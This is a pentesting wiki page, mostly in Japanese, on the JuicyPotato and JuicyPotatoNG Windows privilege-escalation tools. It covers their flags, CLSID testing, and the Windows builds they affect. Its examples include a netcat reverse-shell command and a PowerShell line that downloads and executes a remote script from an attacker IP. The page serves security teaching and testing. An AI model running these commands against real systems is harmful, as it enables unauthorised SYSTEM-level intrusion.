# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato はレガシーです。一般的に Windows 10 1803 / Windows Server 2016 までのバージョンで動作します。Windows 10 1809 / Server 2019 以降で導入された Microsoft のハードニングによって元の手法は動作しなくなりました。これら以降のビルドでは PrintSpoofer、RoguePotato、SharpEfsPotato/EfsPotato、GodPotato などのモダンな代替手段を検討してください。最新のオプションと使用法については下のページを参照してください。


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (abusing the golden privileges) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_A sugared version of_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, with a bit of juice, i.e. **another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM**_

#### You can download juicypotato from [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Compatibility quick notes

- 現在のコンテキストが SeImpersonatePrivilege または SeAssignPrimaryTokenPrivilege を持っている場合、Windows 10 1803 および Windows Server 2016 までで安定して動作します。
- Windows 10 1809 / Windows Server 2019 以降での Microsoft によるハードニングによって破壊されています。これらのビルドでは上で挙げた代替手段を優先してください。

### Summary <a href="#summary" id="summary"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) and its [variants](https://github.com/decoder-it/lonelypotato) leverages the privilege escalation chain based on [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) having the MiTM listener on `127.0.0.1:6666` and when you have `SeImpersonate` or `SeAssignPrimaryToken` privileges. During a Windows build review we found a setup where `BITS` was intentionally disabled and port `6666` was taken.

We decided to weaponize [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Say hello to Juicy Potato**.

> For the theory, see [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) and follow the chain of links and references.

我々は `BITS` 以外にも悪用できる COM サーバが複数存在することを発見しました。これらは以下を満たす必要があります:

1. 現在のユーザからインスタンス化可能であること（通常はインパーソネーション権限を持つ“service user”）
2. `IMarshal` インターフェイスを実装していること
3. エレベートされたユーザ（SYSTEM、Administrator、…）として実行されていること

いくつかのテスト後、複数の Windows バージョン上で [interesting CLSID’s](http://ohpe.it/juicy-potato/CLSID/) の広範なリストを取得・テストしました。

### Juicy details <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato により以下が可能です:

- **Target CLSID** _pick any CLSID you want._ [_Here_](http://ohpe.it/juicy-potato/CLSID/) _you can find the list organized by OS._
- **COM Listening port** _定義したい COM リッスンポートを指定できます（マシュアルされたハードコーディングの 6666 の代わりに）_
- **COM Listening IP address** _サーバを任意の IP にバインドできます_
- **Process creation mode** _インパーソネートされたユーザの権限に応じて以下から選べます:_
- `CreateProcessWithToken` (needs `SeImpersonate`)
- `CreateProcessAsUser` (needs `SeAssignPrimaryToken`)
- `both`
- **Process to launch** _エクスプロイトが成功した場合に起動する実行ファイルやスクリプトを指定できます_
- **Process Argument** _起動するプロセスの引数をカスタマイズできます_
- **RPC Server address** _ステルスなアプローチのために外部の RPC サーバへ認証することができます_
- **RPC Server port** _外部サーバへ認証したいがファイアウォールがポート `135` をブロックしている場合に便利です…_
- **TEST mode** _主にテスト目的、すなわち CLSID のテスト用です。DCOM を作成しトークンのユーザを表示します。テストについては_ [_here for testing_](http://ohpe.it/juicy-potato/Test/)

### Usage <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### 最終的な考察 <a href="#final-thoughts" id="final-thoughts"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

ユーザーに `SeImpersonate` または `SeAssignPrimaryToken` 権限がある場合、あなたは **SYSTEM** です。

これらすべての COM サーバーの悪用を完全に防ぐことはほぼ不可能です。`DCOMCNFG` を使ってこれらオブジェクトの権限を変更することを検討するかもしれませんが、かなり難しいでしょう。

実際の解決策は、`* SERVICE` アカウントで動作する機密性の高いアカウントおよびアプリケーションを保護することです。`DCOM` を停止すれば確かにこのエクスプロイトを抑制できますが、基盤となる OS に深刻な影響を与える可能性があります。

出典: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## JuicyPotatoNG (2022+)

JuicyPotatoNG は、以下を組み合わせることで、最新の Windows 上に JuicyPotato スタイルのローカル権限昇格を再導入します:
- 選択したポート上のローカル RPC サーバーへの DCOM OXID 解決を行い、古いハードコードされた 127.0.0.1:6666 リスナーを回避します。
- SSPI フックを使い、RpcImpersonateClient を必要とせずに受信する SYSTEM 認証をキャプチャしてなりすます機能。これにより SeAssignPrimaryTokenPrivilege のみが存在する場合でも CreateProcessAsUser が可能になります。
- PrintNotify / ActiveX Installer Service クラスをターゲットにする際に以前必要だった INTERACTIVE グループ要件など、DCOM アクティベーション制約を満たすためのトリック。

重要な注意点（ビルドごとに挙動が変化しています）:
- September 2022: Initial technique worked on supported Windows 10/11 and Server targets using the “INTERACTIVE trick”.
- January 2023 update from the authors: Microsoft later blocked the INTERACTIVE trick. A different CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) restores exploitation but only on Windows 11 / Server 2022 according to their post.

基本的な使い方（詳細なフラグはヘルプ参照）:
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
Windows 10 1809 / Server 2019 を対象としていて classic JuicyPotato がパッチ適用されている場合は、上部にリンクされている代替（RoguePotato、PrintSpoofer、EfsPotato/GodPotato 等）を優先してください。NG はビルドやサービスの状態によっては状況依存です。

## 例

注: 試す CLSID の一覧は [this page](https://ohpe.it/juicy-potato/CLSID/) を参照してください。

### nc.exe を使った reverse shell を取得する
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Launch a new CMD (if you have RDP access)

![](<../../images/image (300).png>)

## CLSID Problems

多くの場合、JuicyPotato が使用するデフォルトの CLSID は **機能せず**、exploit は失敗します。通常、**動作する CLSID** を見つけるには複数回の試行が必要です。特定のオペレーティングシステムで試す CLSID の一覧を取得するには、次のページを参照してください：

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **Checking CLSIDs**

まず、juicypotato.exe に加えていくつかの実行可能ファイルが必要です。

[Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) をダウンロードして PS セッションに読み込み、[GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1) をダウンロードして実行します。そのスクリプトはテスト用の CLSID 候補リストを作成します。

次に [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(CLSID リストと juicypotato 実行ファイルへのパスを変更してください) をダウンロードして実行します。これにより全ての CLSID を順に試し、**ポート番号が変わったときは、その CLSID が動作したことを意味します**。

パラメータ -c を使用して、動作する CLSID を**確認**してください

## References

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)

{{#include ../../banners/hacktricks-training.md}}
